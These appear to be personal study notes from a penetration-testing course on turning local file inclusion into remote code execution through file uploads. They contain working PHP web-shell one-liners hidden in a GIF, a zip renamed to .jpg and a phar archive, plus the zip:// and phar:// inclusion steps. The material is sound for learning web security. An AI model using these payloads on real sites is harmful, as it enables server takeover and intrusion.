- If the vulnerable **function has code `Execute` capabilities,** then the code within the **file we upload will get executed if we include it,** regardless of the file extension or file type.
- For example, we can **upload an image file (e.g. `image.jpg`), ==and store a PHP web shell code==** within it 'instead of image data', and ==**if we include it through the LFI vulnerability, the PHP code will get executed**== and we will have remote code execution.
- As mentioned in the first section, the following are the functions that allow executing code with file inclusion, any of which would work with this section's attacks:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

# Image upload
---
- Image upload is very common in most modern web applications, **as uploading images is widely regarded as safe if the upload function is securely coded.**

## Crafting Malicious Image
- Our first step is to create a malicious **image containing a PHP web shell code** that still looks and works as an image.
- So, we will use an allowed **image extension in our file name (e.g. `shell.gif`)**
- Should **==also include the image magic bytes at the beginning==** of the file content (e.g. `GIF8`) just in case the upload form checks for both the extension and content type as well.
- We can do so as follows:
	- `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif`

**Note:** We are using a **`GIF` image** in this case since its **magic bytes are easily typed, as they are ASCII characters,** while other **extensions have magic bytes in binary that we would need to URL encode.** However, this attack would work with any allowed image or file type.

- Now, we need to **upload our malicious image file.** To do so, we can go to the **`Profile Settings` page and click on the avatar image** to select our image.

# Uploaded File Path
---
- To include the uploaded file, **we need to know the path to our uploaded file.**
- In most cases, especially with images, **we would get access to our uploaded file and can get its path from its URL**. In our case, ==**if we inspect the source code after uploading the image==,** we can get its URL:
	- `<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">`

**Note:** As we can see, we can use `/profile_images/shell.gif` for the file path. If **we do not know where the file is uploaded**, then we can **fuzz for an uploads directory, and then fuzz for our uploaded file**, though this **may not always work as some web applications properly hide the uploaded files.**
	![[Pasted image 20251103063000.png]]

**Note:** To include to our uploaded file, we used `./profile_images/` as in this case the LFI vulnerability does not prefix any directories before our input. In case it did prefix a directory before our input, then we simply need to `../` out of that directory and then use our URL path, as we learned in previous sections.

# Zip Upload
---
- We **can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code**. 
- However, **this wrapper isn't enabled by default, so this method may not always work.** 
- To do so, we can **start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:**
	- `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php`

**Note:** Even though we named our zip archive as (shell.jpg)**, some upload forms may still detect our file as a zip archive through content-type tests** and disallow its upload, so this attack has a **higher chance of working if the upload of zip archives is allowed.**

- Once we **upload the `shell.jpg` archive**, we can include it **with the `zip` wrapper as (`zip://shell.jpg`)**, and then refer to any files within it with `#shell.php`
- Finally, **we can execute commands as we always do with `&cmd=id`, as follows**:
	- ![[Pasted image 20251103063237.png]]
- **Note:** We added the uploads directory (`./profile_images/`) before the file name, **as the vulnerable page (`index.php`) is in the main directory.**

# Phar Upload
---
- Finally, **we can use the `phar://` wrapper to achieve a similar result**. 
- To do so, we will first write the following PHP script into a `shell.php` file:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
- This script **can be compiled into a `phar` file** that **when called would write a web shell to a `shell.txt` sub-file, which we can interact with**. 
- We can **compile it into a `phar` file and rename it to `shell.jpg`** as follows:
	- `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg`

- Now, we should have a phar file called `shell.jpg`
- Once **we upload it to the web application, we can simply call it with `phar://` and provide its URL path**, and then specify the **phar sub-file with `/shell.txt`** (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
	- ![[Pasted image 20251103063544.png]]

- Both the ==**`zip` and `phar` wrapper methods should be considered as alternative methods**== in case the first method did not work, as the **first method we discussed is the most reliable among the three.**